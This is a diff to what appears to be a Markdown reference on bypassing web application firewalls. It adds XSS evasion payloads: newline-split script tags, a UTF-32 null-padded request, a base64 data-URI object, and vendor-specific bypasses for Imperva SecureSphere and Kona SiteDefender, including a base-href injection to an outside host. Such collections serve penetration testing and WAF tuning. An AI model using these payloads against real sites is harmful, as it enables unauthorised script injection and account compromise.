@@ -1417,8 +1417,10 @@ Wanna detect WAFs? Lets see how.
     </tr>
 </table>
 
-## Evasion Techniques
+# Evasion Techniques
 Lets look at some methods of bypassing and evading WAFs.
+
+## Cross Site Scripting:
 
 ### Fuzzing/Bruteforcing:
 #### Method:  
@@ -1447,7 +1449,7 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 
 #### Techniques:
 
-##### Keyword Filter Detection/Bypass
+### Keyword Filter Detection/Bypass
 
 __SQL Injection__
 
@@ -1512,7 +1514,6 @@ __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group b
 
 __Scenario 2: Cross Site Scripting__
 
-##### Step 1:
 - Normal deliberate test:  
 ```
 <script>alert()</script>
@@ -1523,6 +1524,8 @@ __Scenario 2: Cross Site Scripting__
 ```
 - Bypassing firewall regex with new line (`\r\n`):
 ```
+<script>\r\nalert(1)</script>
+
 <script>
 alert(1)</script>
 ```
@@ -1563,10 +1566,10 @@ script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0
 
 Example request:
 <pre>
-    GET <b>/page.php?param=∀㸀㰀script㸀alert(1)㰀/script㸀</b> HTTP/1.1
+    GET <b>/page.php?p=%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E</b> HTTP/1.1
     Host: site.com
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
-    <b>Accept-Charset:utf-32, iso-8859-1;q=0.5</b>
+    <b>Accept-Charset:utf-32; q=0.5</b>
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
 </pre>
@@ -1684,6 +1687,11 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 
 ### __Imperva SecureSphere__
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
+- XSS Bypass by [@Alra3ees](https://twitter.com/alra3ees)
+```
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+```
 - XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
@@ -1692,6 +1700,10 @@ User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
 <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
 <img/src=q onerror='new Function`al\ert\`1\``'>
+```
+- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
+```
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
 - SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
 ```
@@ -1890,6 +1902,12 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
     GET /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+```
+
+### __Kona SiteDefender__
+- XSS Bypass by [@zseano](https://twitter.com/zseano)
+```
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
 ## Awesome Tools
